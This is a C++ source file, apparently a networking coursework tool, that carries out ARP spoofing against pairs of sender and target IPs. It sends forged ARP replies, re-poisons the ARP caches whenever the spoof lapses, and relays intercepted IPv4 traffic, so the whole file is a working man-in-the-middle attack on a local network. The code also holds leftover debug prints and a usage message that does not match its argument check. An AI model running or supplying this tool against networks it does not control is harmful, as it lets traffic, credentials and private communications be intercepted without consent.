#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <thread>
#include <mutex>
#include <vector>
#include <string>
#include <sstream>
#include <map>
#include <string>
#include <iostream>



#define MAC_SIZE 6

#define MTU 1500

std::mutex ip_to_mac_mutex;
std::map<std::string, std::string> ip_to_mac;
static std::mutex m;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
    printf("syntax: send-arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}



int getMyIp(const char* dev, EthArpPacket &packet) {
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Fail to get interface IP address - socket() failed - %m\n");
        return -1;
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        printf("Fail to get interface IP address - ioctl(SIOCSIFADDR) failed - %m\n");
        close(sockfd);
        return -1;
    }

    close(sockfd);

    packet.arp_.sip_ = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;

    return 0;
}
unsigned char* getMyMac(const char* dev) {
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return NULL;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return NULL;
    }

    close(sockfd);

    unsigned char* mac_address = (unsigned char*)malloc(MAC_SIZE);
    if (mac_address == NULL) {
        printf("Failed to allocate memory for MAC address\n");
        return NULL;
    }

    memcpy(mac_address, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
    return mac_address;
}

std::pair<std::string, std::string> hex_to_string(Ip mip,Mac mmac){
    std::string ip_str = static_cast<std::string>(mip);
    std::string mac_str = static_cast<std::string>(mmac);
    return std::make_pair(ip_str,mac_str);
}

void ip_to_mac_init(Ip mip,Mac mmac){
    std::pair<std::string,std::string> p= hex_to_string(mip,mmac);
    std::string modified_ip=p.first;
    std::string modified_mac=p.second;
    if(ip_to_mac.find(modified_ip) == ip_to_mac.end()) {
        std::lock_guard<std::mutex> lock(ip_to_mac_mutex);
        ip_to_mac[modified_ip] = modified_mac;
    }
}

bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    while (true) {
        
        struct pcap_pkthdr* header;
        const u_char* responsePacket;
        int res = pcap_next_ex(handle, &header, &responsePacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return false;
        }
        
        // detection for eth-arp packet(sender'sip)
        EthArpPacket* recvPacket = (EthArpPacket*)responsePacket;
        if(ip_to_mac.find(static_cast<std::string>(recvPacket->arp_.sip_)) == ip_to_mac.end()){ 
            ip_to_mac_init(htonl(recvPacket->arp_.sip_),recvPacket->arp_.smac_);
        } 
        if (ntohs(recvPacket->eth_.type_) != EthHdr::Arp) {
            continue;
        }
        if(ntohs(recvPacket->arp_.op_) != ArpHdr::Reply) {
            continue;
        }
        if(recvPacket->arp_.sip_ != packet.arp_.tip_) {
            continue;
        }
        
        
        
        memcpy(&packet.arp_.tmac_, &recvPacket->arp_.smac_, MAC_SIZE); 
        memcpy(&packet.eth_.dmac_, &recvPacket->eth_.smac_, MAC_SIZE);


        return true;
    }
}

bool sendArpSpoof(pcap_t* handle,const char* dev,const char* sender,const char* target) {

    EthArpPacket myPacket;

    //config default

    // Get network information
    if(getMyIp(dev,myPacket)==-1){
        return false;
    }



	myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
	myPacket.eth_.type_ = htons(EthHdr::Arp);

	myPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	myPacket.arp_.pro_ = htons(EthHdr::Ip4);
	myPacket.arp_.hln_ = Mac::SIZE;
	myPacket.arp_.pln_ = Ip::SIZE;
	myPacket.arp_.op_ = htons(ArpHdr::Request);  
	// myPacket.arp_.smac_ = Mac("00:00:00:00:00:00"); -> after getMyMac() 
	// myPacket.arp_.sip_ = htonl(Ip("0.0.0.0"));  -> after getMyIp()
	myPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
	myPacket.arp_.tip_ = htonl(Ip(sender));

    unsigned char *mymac = getMyMac(dev);
    if (mymac==NULL){
        return false;
    }
    memcpy(&myPacket.eth_.smac_,mymac,MAC_SIZE);
    memcpy(&myPacket.arp_.smac_,mymac,MAC_SIZE);

    free(mymac);
    if (!getSenderMac(handle, myPacket)) {
        printf("Failed to get sender MAC address.\n");
        return false;
    }

    // ARP spoof target
    myPacket.arp_.sip_ = htonl(Ip(target));
    myPacket.arp_.op_ = htons(ArpHdr::Reply);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&myPacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    printf("Spoofed ARP of target %s\n", target);
    return true;
}



bool check_spoofed(pcap_t* handle) {
    struct pcap_pkthdr* header; 
    const u_char *packet;    
    struct libnet_ethernet_hdr* eth_hdr;
    while(1){
        int res = pcap_next_ex(handle, &header,&packet);
        if (res==0){
            continue;
        }
        eth_hdr = (struct libnet_ethernet_hdr*)(packet);
        // If it's not an ARP packet, exit the function
        if(ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP)
            continue;
        printf("첫 번째 지나감\n");
        break;
    }    
    struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);

    // Check for broadcast
    const uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    if (memcmp(eth_hdr->ether_dhost, broadcast_mac, sizeof(broadcast_mac)) != 0) {
        return false;
    }
    printf("두 번째 지나감\n");

    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, (packet + LIBNET_ETH_H + LIBNET_ARP_H), ip, INET_ADDRSTRLEN);
    std::string ip_str(ip);

    char mac[18];
    snprintf(mac, 18, "%02x:%02x:%02x:%02x:%02x:%02x", eth_hdr->ether_shost[0], eth_hdr->ether_shost[1], eth_hdr->ether_shost[2], eth_hdr->ether_shost[3], eth_hdr->ether_shost[4], eth_hdr->ether_shost[5]);
    std::string mac_str(mac);

    if (ip_to_mac.find(ip_str) != ip_to_mac.end() && ip_to_mac[ip_str] != mac_str) {
        printf("ARP Spoofing Detected! Original MAC: %s, New MAC: %s\n", ip_to_mac[ip_str].c_str(), mac_str.c_str());
        return true;
    }
    printf("mac is : %s\n",mac_str.c_str());
    printf("ip_to_mac is %s\n",ip_to_mac[ip_str].c_str());
    // Otherwise, map the IP to the MAC

    return false;
}


void reInfect(pcap_t* handle,const char* dev,const char* sI,const char* tI){
    if(check_spoofed(handle)==true){
        printf("spoofed\n");
    }
    else{
        printf("no spoofed\n");
        sendArpSpoof(handle,dev,sI,tI);
        printf("ip_to_mac is : %s\n\n",ip_to_mac[std::string(sI)].c_str());
    }
}
bool convert_mac(const char* mac_str, uint8_t* mac_bytes) {
    int values[6];
    if (6 == sscanf(mac_str, "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
        for (int i = 0; i < 6; ++i) {
            mac_bytes[i] = (uint8_t) values[i];
        }
        return true;
    } else {
        return false; // Failed to parse MAC address
    }
}
void relay_thread(const char* dev,const char* sI,const char* tI) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return;
    }    
    
    struct pcap_pkthdr* header;  // header pcap gives us
    const u_char *packet;       // actual packet

    // loop for packet capturing

    while (1) {
        m.lock();
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0){ 
            printf("res error\n");
            m.unlock();
            std::this_thread::yield();
            continue;}
        if (res == -1 || res == -2){
            m.unlock();
            printf("res==-1 or res==-2 continue\n\n");
            std::this_thread::yield();
            break;
        }

        //Ip packet parsing
        // check Eth_type -> if ipv4 -> relay
        struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)packet;
        struct libnet_ipv4_hdr *ip_hdr=(struct libnet_ipv4_hdr*)(packet+sizeof(struct libnet_ethernet_hdr));
        char src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];
        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP){
            printf("293 line continue\n\n");
            m.unlock();
            std::this_thread::yield();
            continue;}
        inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &(ip_hdr->ip_dst), dst_ip, INET_ADDRSTRLEN);
        if (strcmp(src_ip, sI) != 0 ){
            printf("src_ip is : %s, sI is : %s\n\n",src_ip,sI);
            printf("dst_ip is : %s, tI is : %s\n\n",dst_ip,tI);
            printf("strcmp(src_ip,si)!=0 여기소 continue\n\n");
            m.unlock();
            std::this_thread::yield();
            continue;
        } 

        printf("pass!\n");
        // modify smac to mine (attacker)
        printf("pass2!\n");
        unsigned char *m_mac= getMyMac(dev);
        if (m_mac == NULL) {
            fprintf(stderr, "Could not get MAC address.\n");
            m.unlock();
            std::this_thread::yield();
            return;
        }

        const char* d_mac = ip_to_mac[std::string(tI)].c_str();
	std::cout << "d_mac is " << d_mac << std::endl;
        std::cout << "mac addr is "<< ip_to_mac[std::string(dst_ip)].c_str()<<"\n";
 
	uint8_t d_bytes[6];
	uint8_t s_bytes[6];
	if (convert_mac(d_mac, d_bytes)) {
    		memcpy(eth_hdr->ether_dhost, d_bytes, 6);
	} else {
   	printf("Failed to convert MAC addresses.\n");
	}

        free(m_mac);         
        //send to target

        if (header->len > MTU) {
            printf("jumbo frame\n");
            m.unlock();
            std::this_thread::yield();
            continue;
        } else if (pcap_sendpacket(handle, packet, header->len) != 0) {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
            m.unlock();
            std::this_thread::yield();
            return;
        }

        m.unlock();
        printf("good!\n");
    }
    pcap_close(handle);
}
void arp_check_thread(const char* dev, const char* sI, const char* tI) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return;
    }
    sendArpSpoof(handle,dev,sI,tI);
    sendArpSpoof(handle,dev,tI,sI);
    while (true) {
        if (check_spoofed(handle)==false) {
            reInfect(handle, dev, sI, tI);
        }
        std::this_thread::sleep_for(std::chrono::seconds(1)); // 10초마다 확인합니다. 필요에 따라 조절 가능합니다.
    }
    pcap_close(handle);
}

bool isValidIP(const std::string& ip) {
    std::istringstream iss(ip);
    std::string segment;
    int count = 0, value;

    while (std::getline(iss, segment, '.')) {
        count++;

        std::istringstream issSegment(segment);
        issSegment >> value;

        if (segment.empty() || value < 0 || value > 255 || (issSegment.peek() != EOF))
            return false;
    }

    return count == 4;
}

int main(int argc, char* argv[]) {
	if (argc !=2) {
		usage();
		return -1;
	}
    std::cout << "Input pairs of sender's IP and target's IP you want in each line separated by a space. If you want to end, input 'N'\n";
    
    std::vector<std::string> senders;
    std::vector<std::string> targets;
    std::string line, sender, target;

    while (true) {
        std::cout << "Enter sender's IP and target's IP: \n";
        std::getline(std::cin, line);
        std::istringstream iss(line);
        
        iss >> sender >> target;

        if (sender == "N" || sender == "n") {
            break;
        }

        if (!isValidIP(sender) || !isValidIP(target)) {
            std::cout << "Invalid IP format! Please input again.\n";
            continue;
        }

        senders.push_back(sender);
        targets.push_back(target);
    }

    std::cout << "\nInput ended.\n\n";
    
    for (size_t i = 0; i < senders.size(); ++i) {
        std::cout << "Sender: " << senders[i] << ", Target: " << targets[i] << std::endl;
    }

    char* dev = argv[1];

    std::vector<std::thread> arp_check_threads;
    std::vector<std::thread> relay_threads;
    for(int i=0;i<senders.size();i++){
        arp_check_threads.push_back(std::thread(arp_check_thread,dev,senders[i].c_str(),targets[i].c_str()));
        relay_threads.push_back(std::thread(relay_thread,dev,senders[i].c_str(),targets[i].c_str()));

    }
    for(int i=0;i<senders.size();i++){
        arp_check_threads[i].join();
        relay_threads[i].join();
    }
    return 0;
}
